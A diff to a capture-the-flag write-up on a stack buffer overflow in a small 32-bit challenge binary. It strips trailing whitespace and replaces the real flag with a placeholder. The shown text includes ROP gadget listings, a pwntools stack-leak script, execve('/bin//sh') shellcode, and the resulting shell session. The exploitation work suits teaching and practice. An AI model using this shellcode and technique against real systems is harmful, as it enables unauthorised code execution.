@@ -38,24 +38,24 @@ So when the program ran it would overwrite the stack with your input up to `0x3c
 ```
 This means that you would have to type 20 characters before you hit the return address.
 `0x3c` = 60 so you have 60-20 = 40 bytes of buffer overflow. Thats a good amount. I ended up looking at the ROPgadgets to see what I could do to change the control flow of the program:
-`$ ROPgadget --binary ./start` 
+`$ ROPgadget --binary ./start`
 ```
-0x0804809b : adc al, 0xc3 ; pop esp ; xor eax, eax ; inc eax ; int 0x80 
-0x0804808e : add al, 0xcd ; xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80 
-0x08048099 : add esp, 0x14 ; ret 
-0x08048086 : daa ; mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80 0x080480a0 : inc eax ; int 0x80 
-0x0804808f : int 0x80 
-0x0804809a : les edx, ptr [ebx + eax*8] ; pop esp ; xor eax, eax ; inc eax ; int 0x80 
-0x08048095 : mov al, 3 ; int 0x80 
-0x0804808d : mov al, 4 ; int 0x80 
-0x0804808b : mov bl, 1 ; mov al, 4 ; int 0x80 
+0x0804809b : adc al, 0xc3 ; pop esp ; xor eax, eax ; inc eax ; int 0x80
+0x0804808e : add al, 0xcd ; xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80
+0x08048099 : add esp, 0x14 ; ret
+0x08048086 : daa ; mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80 0x080480a0 : inc eax ; int 0x80
+0x0804808f : int 0x80
+0x0804809a : les edx, ptr [ebx + eax*8] ; pop esp ; xor eax, eax ; inc eax ; int 0x80
+0x08048095 : mov al, 3 ; int 0x80
+0x0804808d : mov al, 4 ; int 0x80
+0x0804808b : mov bl, 1 ; mov al, 4 ; int 0x80
 0x08048089 : mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80
-0x08048093 : mov dl, 0x3c ; mov al, 3 ; int 0x80 
-0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80 
-0x0804809d : pop esp ; xor eax, eax ; inc eax ; int 0x80 
-0x0804809c : ret 
-0x08048090 : xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80 
-0x0804809e : xor eax, eax ; inc eax ; int 0x80 
+0x08048093 : mov dl, 0x3c ; mov al, 3 ; int 0x80
+0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80
+0x0804809d : pop esp ; xor eax, eax ; inc eax ; int 0x80
+0x0804809c : ret
+0x08048090 : xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80
+0x0804809e : xor eax, eax ; inc eax ; int 0x80
 0x08048091 : xor ebx, ebx ; mov dl, 0x3c ; mov al, 3 ; int 0x80
 ```
 Seeing this I realized my options were limited, but I decided to start trying things out. The first gadget I tried was: `0x080480a0 : inc eax ; int 0x80` since I knew it would change the function that gets called. What I got was `0x18 + 1` for my eax value which corresponded to the `stime` syscall. After trying different inputs I found that eax was being saved from the `read` function which would return the size of the input. Which was `0x18`. When I increased the size of the input, I could get different syscall codes untill I reached `0x3c`(the max read size). Looking at my options for possible syscalls led to nothing. So that idea was scrapped.
@@ -64,20 +64,20 @@ The next idea I had was to use shellcode in my input to run some code (maybe pop
 `0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80`
 Essentially this would print out 20 bytes from the stack. since we had already moved the stack pointer past the string that it gives, it would run: `write(1, stack, 0x14)` this is what my program looked like:
 ```python
-#! /usr/bin/env python 
-from pwn import * 
-context.terminal = ['tmux', 'splitw', '-h']  
+#! /usr/bin/env python
+from pwn import *
+context.terminal = ['tmux', 'splitw', '-h']
 addr_ecx2 = 0x08048087
-p = process("./start") 
-gdb.attach(p, 'b _start') 
+p = process("./start")
+gdb.attach(p, 'b _start')
 p.recv()
-payload = b"A"*(0x14) 
-payload += p32(addr_ecx2) 
-p.send(payload) 
-x = p.recv() 
-print(hex(u32(x[0:4]))) 
-print(hex(u32(x[4:8]))) 
-print(hex(u32(x[8:12]))) 
+payload = b"A"*(0x14)
+payload += p32(addr_ecx2)
+p.send(payload)
+x = p.recv()
+print(hex(u32(x[0:4])))
+print(hex(u32(x[4:8])))
+print(hex(u32(x[8:12])))
 p.interactive()
 ```
 I was able to leak 3 addresses with one of them in the same page as the stack:(`x[0:4]`)
@@ -90,18 +90,18 @@ And it didn't work.
 Why? The shellcode I thought was too long. I thought the shellcode was somehow breaking after like 10 characters. I spent an insane amount of time trying to get the shellcode to be small enough to fit into the space.
 Then I looked really hard at what was happening. The instructions from my shellcode looked like this:
 ```
-push $SYS_execve 
+push $SYS_execve
 pop %eax
 push $0
-push $0x68732f6e 
+push $0x68732f6e
 push $0x69622f2f
-xor %ecx, %ecx 
-cltd 
-push %esp 
-pop %ebx 
+xor %ecx, %ecx
+cltd
+push %esp
+pop %ebx
 int $0x80
 ```
-I noticed that when the program got to `push $0x69622f2f` it would overwrite the rest of the shellcode. OF COURSE!!! The shellcode was on the stack and pushing values onto the stack would overwrite those values. 
+I noticed that when the program got to `push $0x69622f2f` it would overwrite the rest of the shellcode. OF COURSE!!! The shellcode was on the stack and pushing values onto the stack would overwrite those values.
 
 All I had to do to solve it was place the shellcode at the end of my input so it would overwrite useless parts of the stack and boom! it worked:
 ```
@@ -114,6 +114,6 @@ flag
 run.sh
 start
 $ cat flag
-FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
+FLAG{EXAMPLE_FLAG}
 ```
 The final expoit script is in this repo.
